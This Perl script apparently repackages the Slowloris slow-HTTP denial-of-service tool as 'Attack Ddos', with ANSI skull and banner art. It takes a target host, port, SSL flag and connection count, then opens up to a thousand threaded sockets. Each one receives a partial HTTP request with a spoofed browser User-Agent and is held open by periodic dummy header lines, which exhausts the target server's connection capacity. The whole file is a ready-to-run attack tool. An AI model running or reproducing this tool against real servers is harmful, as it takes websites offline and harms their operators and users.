#!/usr/bin/perl -w
package person;
use strict;
use IO::Socket::INET;
use IO::Socket::SSL;
use Getopt::Long;
use Config;

#ftp .plx
use warnings;
use strict;
use Net::FTP;
use Carp;

$SIG{'PIPE'} = 'IGNORE';    #Ignore broken pipe errors


print "\033[1;30m´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´\033[1;31m\033[1;31¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶\033[1;30m´´´´´´´´´´´´´´´´´´´´´´´´´´´´´\n";
print "\033[1;30m´´´´´´´´´´´´´´´´´´´´´´´´´´´\033[1;31m\033[1;31¶¶¶¶¶¶´´´´´´´´´´´´´¶¶¶¶¶¶¶\033[1;30m´´´´´´´´´´´´´´´´´´´´´´´´\n";
print "\033[1;30m´´´´´´´´´´´´´´´´´´´´´´´´\033[1;31m\033[1;31¶¶¶¶´´´´´´´´´´´´´´´´´´´´´´´¶¶¶¶\033[1;30m´´´´´´´´´´´´´´´´´´´´´´\n";
print "\033[1;30m´´´´´´´´´´´´´´´´´´´´´´´\033[1;31m\033[1;31¶¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶¶\033[1;30m´´´´´´´´´´´´´´´´´´´´´\n";
print "\033[1;30m´´´´´´´´´´´´´´´´´´´´´´\033[1;31m\033[1;31¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶\033[1;30m´´´´´´´´´´´´´´´´´´´´\n";
print "\033[1;30m´´´´´´´´´´´´´´´´´´´´´\033[1;31m\033[1;31¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶\033[1;30m´´´´´´´´´´´´´´´´´´´\n";
print "\033[1;30m´´´´´´´´´´´´´´´´´´´´\033[1;31m\033[1;31¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶\033[1;30m´´´´´´´´´´´´´´´´´´\n";
print "\033[1;30m´´´´´´´´´´´´´´´´´´´´\033[1;31m\033[1;31¶¶´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´¶¶\033[1;30m´´´´´´´´´´´´´´´´´´\n";
print "\033[1;30m´´´´´´´´´´´´´´´´´´´´\033[1;31m\033[1;31¶¶´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´¶¶\033[1;30m´´´´´´´´´´´´´´´´´´\n";
print "\033[1;30m´´´´´´´´´´´´´´´´´´´´\033[1;31m\033[1;31¶¶´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´¶¶\033[1;30m´´´´´´´´´´´´´´´´´´\n";
print "\033[1;30m´´´´´´´´´´´´´´´´´´´´\033[1;31m\033[1;31¶¶´´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´¶¶\033[1;30m´´´´´´´´´´´´´´´´´´\n";
print "\033[1;30m´´´´´´´´´´´´´´´´´´´´\033[1;31m\033[1;31¶¶´´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´¶¶\033[1;30m´´´´´´´´´´´´´´´´´´\n";
print "\033[1;30m´´´´´´´´´´´´´´´´´´´´´\033[1;31m\033[1;31¶¶´¶¶´´´¶¶¶¶¶¶¶¶´´´´´´¶¶¶¶¶¶¶´´´¶¶´¶¶\033[1;30m´´´´´´´´´´´´´´´´´´´\n";
print "\033[1;30m´´´´´´´´´´´´´´´´´´´´´´\033[1;31m\033[1;31¶¶¶¶´¶¶¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶¶¶´¶¶¶¶¶\033[1;30m´´´´´´´´´´´´´´´´´´´\n";
print "\033[1;30m´´´´´´´´´´´´´´´´´´´´´´´\033[1;31m\033[1;31¶¶¶´¶¶¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶¶¶´¶¶¶\033[1;30m´´´´´´´´´´´´´´´´´´´´´\n";
print "\033[1;30m´´´´´´´´´´´´´´\033[1;31m\033[1;31¶¶¶´´´´´´´\033[1;31¶¶´´¶¶¶¶¶¶¶¶´´´´´´´¶¶¶¶¶¶¶¶¶´¶¶´´´´´´´´¶¶¶¶\033[1;30m´´´´´´´´´´\n";
print "\033[1;30m´´´´´´´´´´´´´\033[1;31m\033[1;31¶¶¶¶¶´´´´´¶¶´´´¶¶¶¶¶¶¶´´´¶´¶´´´¶¶¶¶¶¶¶´´´¶¶´´´´´¶¶¶¶¶¶\033[1;30m´´´´´´´´´´\n";
print "\033[1;30m´´´´´´´´´´´´\033[1;31m\033[1;31¶¶´´´¶¶´´´´¶¶´´´´´¶¶¶´´´´¶¶¶¶¶´´´´¶¶¶´´´´´¶¶´´´´¶¶´´´¶¶\033[1;30m´´´´´´´´´´\n";
print "\033[1;30m´´´´´´´´´´´\033[1;31m\033[1;31¶¶¶´´´´¶¶¶¶´´¶¶´´´´´´´´´´¶¶¶´¶¶¶´´´´´´´´´´¶¶´´¶¶¶¶´´´´¶¶¶\033[1;30m´´´´´´´´´\n";
print "\033[1;30m´´´´´´´´´´\033[1;31m\033[1;31¶¶´´´´´´´´´¶¶¶¶¶¶¶¶´´´´´´´¶¶¶´¶¶¶´´´´´´´¶¶¶¶¶¶¶¶¶´´´´´´´´¶¶\033[1;30m´´´´´´´´\n";
print "\033[1;30m´´´´´´´´´´\033[1;31m\033[1;31¶¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶´´´´¶¶¶´¶¶¶´´´´¶¶¶¶¶¶¶¶´´´´´´¶¶¶¶¶¶¶¶\033[1;30m´´´´´´´´\n";
print "\033[1;30m´´´´´´´´´´´´\033[1;31m\033[1;31¶¶¶¶´¶¶¶¶¶´´´´´´¶¶¶¶¶´´´´´´´´´´´´¶¶¶´¶¶´´´´´¶¶¶¶¶¶´¶¶¶\033[1;30m´´´´´´´´´´´\n";
print "\033[1;30m´´´´´´´´´´´´´´´´´´´´\033[1;31m\033[1;31¶¶¶¶¶¶´´¶¶¶´¶¶´´´´´´´´´´´¶¶´¶¶¶´´¶¶¶¶¶¶\033[1;30m´´´´´´´´´´´´´´´´´´\n";
print "\033[1;30m´´´´´´´´´´´´´´´´´´´´´´´´\033[1;31m\033[1;31¶¶¶¶¶¶´¶´´¶¶¶¶¶¶¶¶¶¶¶´¶¶´¶¶¶¶¶¶\033[1;30m´´´´´´´´´´´´´´´´´´´´´´\n";
print "\033[1;30m´´´´´´´´´´´´´´´´´´´´´´´´´´´´\033[1;31m\033[1;31¶¶´¶´¶¶´¶¶´¶´¶¶¶¶¶¶¶´¶¶\033[1;30m´´´´´´´´´´´´´´´´´´´´´´´´´´\n";
print "\033[1;30m´´´´´´´´´´´´´´´´´´´´´´´´´´\033[1;31m\033[1;31¶¶¶¶´¶¶´¶´¶¶´¶´¶¶´¶´¶¶´¶¶¶¶¶\033[1;30m´´´´´´´´´´´´´´´´´´´´´´´\n";
print "\033[1;30m´´´´´´´´´´´´´´´´´´´´´´\033[1;31m\033[1;31¶¶¶¶¶´¶¶´´´¶¶¶¶¶¶¶¶¶¶¶¶¶´´´¶¶´¶¶¶¶¶\033[1;30m´´´´´´´´´´´´´´´´´´´´\n";
print "\033[1;30m´´´´´´´´´´´´´´\033[1;31m\033[1;31¶¶¶¶¶¶¶¶¶¶´´´´´¶¶´´´´´´´´´´´´´´´´´¶¶´´´´´´¶¶¶¶¶¶¶¶¶\033[1;30m´´´´´´´´´´´´\n";
print "\033[1;30m´´´´´´´´´´´´´\033[1;31m\033[1;31¶¶´´´´´´´´´´´¶¶¶¶¶¶¶´´´´´´´´´´´´´¶¶¶¶¶¶¶¶´´´´´´´´´´¶¶\033[1;30m´´´´´´´´´´´\n";
print "\033[1;30m´´´´´´´´´´´´´´\033[1;31m\033[1;31¶¶¶´´´´´¶¶¶¶¶\033[1;30m´´´´´\033[1;30m\033[1;31m\033[1;31¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶\033[1;30m´´´´´\033[1;30m\033[1;31m\033[1;31¶¶¶¶¶´´´´´¶¶¶\033[1;30m´´´´´´´´´´´´\n";
print "\033[1;30m´´´´´´´´´´´´´´´´\033[1;31m\033[1;31¶¶´´´¶¶¶\033[1;30m´´´´´´´´´´´\033[1;30m\033[1;31m\033[1;31¶¶¶¶¶¶¶¶¶\033[1;30m´´´´´´´´´´´\033[1;30m\033[1;31m\033[1;31¶¶¶´´´¶¶\033[1;30m´´´´´´´´´´´´´´\n";
print "\033[1;30m´´´´´´´´´´´´´´´´\033[1;31m\033[1;31¶¶´´¶¶\033[1;30m´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´\033[1;30m\033[1;31m\033[1;31¶¶´´¶¶\033[1;30m´´´´´´´´´´´´´´\n";
print "\033[1;30m´´´´´´´´´´´´´´´´´\033[1;31m\033[1;31¶¶¶¶\033[1;30m´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´\033[1;30m\033[1;31m\033[1;31¶¶¶\033[1;30m´´´´´´´´´´´´´´´´\033[1;37m\033[1;37m\n";
print "\033[1;31m                                          ░▒                  ░             ░▒                   \n"; 
print "\033[1;31m    ███▒     ▒█   ░█░                     ▓█           ████████░        ▓█                   \n";
print "\033[1;31m   ▒█ ▓█     ▓█▓▓░▒██▒▒ ░▒▓▓▓░    ▒▓▓▓░   ▓█    ▓▓░    █▓    ░██▓   ▒▓▓▒▓█   ▒▓▓▓░    ░▓▓▓▒░ \n";
print "\033[1;31m   █▒  ██   ░██▓▒▒███▓░ ▓▓▓▓▓██  ███▓██▓  ▓█  ▒██▒     █▓      ██ ▒██▓▓███ ░██▓▓███  ██▓▓▓██ \n";
print "\033[1;31m  ██▒▒▒██▒   ▒█    █▒   ▒███▓▓█ ██        ▓█░██░       █▓      ▓█▒█▓    ▓█ ██     ██ ██░     \n";
print "\033[1;31m ▒█▓▓██▓██   ▒█░  ░█▒  ██░   ▓█ ██        ▒████        █▓     ███░█▒    ▓█ █▓     ██   ▒▓▓██ \n";
print "\033[1;31m░█▓      ██  ▓█░  ░█▓  ▓█▓░░▒█  ░██▒▒▒█▓  ▓█  ▓██▒     ██░▒▒▒███  ██▓▒▒▓██ ▒██▒▒▒██░ ▓▒░ ░██▒ \n";
print "\033[1;31m▓█       ▒█▒ ▒█░  ░█▒   ▒███▓▓█   ▓███▓   ▒█    ▓█▒    ██████▓░    ▒████▓█  ░▓███▓   ▓████▓░ \n";

print "\033[1;37m\033[1;37m\n\n";
print  <<EOTEXT;
Welcome to Attack Ddos - the low bandwidth, yet greedy and poisonous HTTP client

options
	|==============================================================|
	| -version    -dns         -connections   -tcpto               |
	| -port	      -shost       -cache         -timeout             |
	| -host       -httpready   -ssl           -test                |
	|==============================================================|
EOTEXT



my ( $host, $port, $sendhost, $shost, $test, $version, $timeout, $connections );
my ( $cache, $httpready, $method, $ssl, $rand, $tcpto );
my $result = GetOptions(
	'version'   => \$version,
    'dns=s'     => \$host,
    'shost=s'   => \$shost,
    'httpready' => \$httpready,
    'num=i'     => \$connections,
    'cache'     => \$cache,
    'port=i'    => \$port,
    'https'     => \$ssl,
    'tcpto=i'   => \$tcpto,
    'test'      => \$test,
    'timeout=i' => \$timeout,
);
if ($version) {
print "\033[1;37m╔═══╗ \n";
print "\033[1;37m║███║ \n";
print "\033[1;37m║ (●)  \033[1;33m tType 'perldoc $0' \n";
print "\033[1;37m╚═══╝                           \033[1;31m Version 0.9 \n";
    exit;
}
unless ($host) {
    print "\033[1;33mExamples:\n\n\t\033[1;30mperl $0 \n";
	print "                      \033[1;31m -dns [www.example.com] -options\n";
	print "                      \033[1;31m for help with options.\n\n";	
print "\033[1;37m========================================================================== \n";
exit;
}

unless ($port) {
    $port = 80;
print "\033[1;30m========================================================================== \n";	
    print "                         \033[1;31m Defaulting to port 80.\n";
	}
	
	unless ($tcpto) {
    $tcpto = 5;

    print "               \033[1;31m Defaulting to a 5 second tcp connection timeout.\n";

	}
	
	
unless ($tcpto) {
    $tcpto = 5;

    print "               \033[1;31m Defaulting to a 5 second tcp connection timeout.\n";

	}

unless ($test) {
    unless ($timeout) {
        $timeout = 100;

        print "                  \033[1;31m Defaulting to a 100 second re-try timeout.\n";

    }
    unless ($connections) {
        $connections = 1000; 

        print "                    \033[1;31m Defaulting to 1000 connections.\n";

    }
}



my $usemultithreading = 0;
if ( $Config{usethreads} ) {
    print "                            \033[1;31mMultithreading enabled.\n";
	print "\033[1;30m========================================================================== \n";
    $usemultithreading = 1;
    use threads;
    use threads::shared;
}
else {
	
    print "\033[1;34mNo multithreading capabilites found!\n";
    print "\033[1;31mAttak Ddos will be slower than normal as a result.\n";
}


my $packetcount : shared     = 0;
my $failed : shared          = 0;
my $connectioncount : shared = 0;

srand() if ($cache);

if ($shost) {
    $sendhost = $shost;
}
else {
    $sendhost = $host;
}
if ($httpready) {
    $method = "POST";
}
else {
    $method = "GET";
}

if ($test) {
    my @times = ( "2", "30", "90", "240", "500" );
    my $totaltime = 0;
    foreach (@times) {
        $totaltime = $totaltime + $_;
    }
    $totaltime = $totaltime / 60;
    print "\033[1;32mThis test could take up to $totaltime minutes.\n";

    my $delay   = 0;
    my $working = 0;
    my $sock;

    if ($ssl) {
        if (
            $sock = new IO::Socket::SSL(
                PeerAddr => "$host",
                PeerPort => "$port",
                Timeout  => "$tcpto",
                Proto    => "tcp",
            )
          )
        {
            $working = 1;
        }
    }
    else {
        if (
            $sock = new IO::Socket::INET(
                PeerAddr => "$host",
                PeerPort => "$port",
                Timeout  => "$tcpto",
                Proto    => "tcp",
            )
          )
        {
            $working = 1;
        }
    }
    if ($working) {
        if ($cache) {
            $rand = "?" . int( rand(99999999999999) );
        }
        else {
            $rand = "";
        }
        my $primarypayload =
            "GET /$rand HTTP/1.1\r\n"
          . "Host: $sendhost\r\n"
          . "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
          . "Content-Length: 42\r\n";
        if ( print $sock $primarypayload ) {
            print "\033[1;32mConnection successful, now comes the waiting game...\n";
        }
    else {
        print "\033[1;32mUhm... I can't connect to $host:$port.\n";
        print "\033[1;35mIs something wrong?\nDying.\n";
        exit;
        }
    }
    else {
        print "\033[1;32m Uhm... I can't connect to $host:$port.\n";
        print "\033[1;32m Is something wrong?\nDying.\n";
        exit;
    }
    for ( my $i = 0 ; $i <= $#times ; $i++ ) {
        print "Trying a $times[$i] second delay: \n";
        sleep( $times[$i] );
        if ( print $sock "X-a: b\r\n" ) {
            print "\033[1;37m\tWorked.\n";
            $delay = $times[$i];
        }
        else {
            if ( $SIG{__WARN__} ) {
                $delay = $times[ $i - 1 ];
                last;
            }
print "\033[1;31m\tFailed after $times[$i] seconds.\n";
        }
    }

    if ( print $sock "Connection: Close\r\n\r\n" ) {
        print "\033[1;33mOkay that's enough time. Attack Ddos closed the socket.\n";
        print "\033[1;35mUse $delay seconds for -timeout.\n";
        exit;
    }
    else {
        print "\033[1;37mRemote server closed socket.\n";
        print "\033[1;37mUse $delay seconds for -timeout.\n";
        exit;
    }
    if ( $delay < 166 ) {
        print <<EOSUCKS2BU;
Since the timeout ended up being so small ($delay seconds) and it generally 
takes between 200-500 threads for most servers and assuming any latency at 
all...  you might have trouble using Slowloris against this target.  You can 
tweak the -timeout flag down to less than 10 seconds but it still may not 
build the sockets in time.
EOSUCKS2BU
    }
}
else {
 print"\033[1;37mConnecting to $host:$port every $timeout seconds with $connections sockets:\n";
    if ($usemultithreading) {
        domultithreading($connections);
    }
    else {
        doconnections( $connections, $usemultithreading );
    }
}

sub doconnections {
    my ( $num, $usemultithreading ) = @_;
    my ( @first, @sock, @working );
    my $failedconnections = 0;
    $working[$_] = 0 foreach ( 1 .. $num );    #initializing
    $first[$_]   = 0 foreach ( 1 .. $num );    #initializing
    while (1) {
        $failedconnections = 0;
 print "\033[1;32m√v^√v^√v^√√v^√v^√vtAttack Ddos\t\tBuilding sockets.√v^√v^√√^√v^√v^√v\n";
print "\033[1;30mtType 'perldoc $0'\n";
print "\033[1;31m                         \033[1;30m┣▇▇▇═─\033[1;30m  \033[1;31m Version 0.9\033[1;31m  \n";
      
        foreach my $z ( 1 .. $num ) {
            if ( $working[$z] == 0 ) {
                if ($ssl) {
                    if (
                        $sock[$z] = new IO::Socket::SSL(
                            PeerAddr => "$host",
                            PeerPort => "$port",
                            Timeout  => "$tcpto",
                            Proto    => "tcp",
                        )
                      )
                    {
                        $working[$z] = 1;
                    }
                    else {
                        $working[$z] = 0;
                    }
                }
                else {
                    if (
                        $sock[$z] = new IO::Socket::INET(
                            PeerAddr => "$host",
                            PeerPort => "$port",
                            Timeout  => "$tcpto",
                            Proto    => "tcp",
                        )
                      )
                    {
                        $working[$z] = 1;
                        $packetcount = $packetcount + 3;  #SYN, SYN+ACK, ACK
                    }
                    else {
                        $working[$z] = 0;
                    }
                }
                if ( $working[$z] == 1 ) {
                    if ($cache) {
                        $rand = "?" . int( rand(99999999999999) );
                    }
                    else {
                        $rand = "";
                    }
                    my $primarypayload =
                        "$method /$rand HTTP/1.1\r\n"
                      . "Host: $sendhost\r\n"
                      . "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
                      . "Content-Length: 42\r\n";
                    my $handle = $sock[$z];
                    if ($handle) {
                        print $handle "$primarypayload";
                        if ( $SIG{__WARN__} ) {
                            $working[$z] = 0;
                            close $handle;
                            $failed++;
                            $failedconnections++;
                        }
                        else {
                            $packetcount++;
                            $working[$z] = 1;
                        }
                    }
                    else {
                        $working[$z] = 0;
                        $failed++;
                        $failedconnections++;
                    }
                }
                else {
                    $working[$z] = 0;
                    $failed++;
                    $failedconnections++;
                }
            }
        }
print "         \033[1;31m            \t\tSending data.\n";
        foreach my $z ( 1 .. $num ) {
            if ( $working[$z] == 1 ) {
                if ( $sock[$z] ) {
                    my $handle = $sock[$z];
                    if ( print $handle "X-a: b\r\n" ) {
                        $working[$z] = 1;
                        $packetcount++;
                    }
                    else {
                        $working[$z] = 0;
                        #debugging info
                        $failed++;
                        $failedconnections++;
                    }
                }
                else {
                    $working[$z] = 0;
                    #debugging info
                    $failed++;
                    $failedconnections++;
                }
            }
        }
        print"     \033[1;37mCurrent stats:\tAttack Ddos has now sent $packetcount packets successfully.\n              This thread now sleeping for $timeout seconds...\n\n";
        sleep($timeout);
    }
}

sub domultithreading {
    my ($num) = @_;
    my @thrs;
    my $i                    = 0;
    my $connectionsperthread = 50;
    while ( $i < $num ) {
        $thrs[$i] =
          threads->create( \&doconnections, $connectionsperthread, 1 );
        $i += $connectionsperthread;
    }
    my @threadslist = threads->list();
    while ( $#threadslist > 0 ) {
        $failed = 0;
    }
}
